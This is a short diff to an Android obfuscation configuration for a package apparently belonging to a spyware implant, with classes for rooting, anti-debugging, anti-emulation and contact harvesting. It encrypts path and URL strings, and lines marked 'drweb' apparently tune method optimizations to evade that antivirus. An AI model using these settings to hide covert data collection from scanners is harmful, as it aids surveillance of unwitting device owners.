@@ -4,8 +4,7 @@
 		com.android.dvci.Root,com.android.dvci.Core,
 		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator,
 		com.android.dvci.module.task.PickContact
-		
-#-encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.Root
+
 
 #-encryptclasses com.android.dvci.*
 -encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
@@ -35,7 +34,10 @@
 
 # l'ottimizzazione seguente fa crashare smali, disabilitare solo se occorre manipolare il codice
 #-optimizations !method/marking/final
--optimizations !method/*
+#-optimizations !method/*
+# -optimizations !method/marking/* #drweb
+# -optimizations !method/removal/*,!method/specialization*,!method/propagation/* #drweb
+-optimizations !method/inlining/*
 
 #-classobfuscationdictionary "compact.txt"
 -classobfuscationdictionary "keywords.txt"
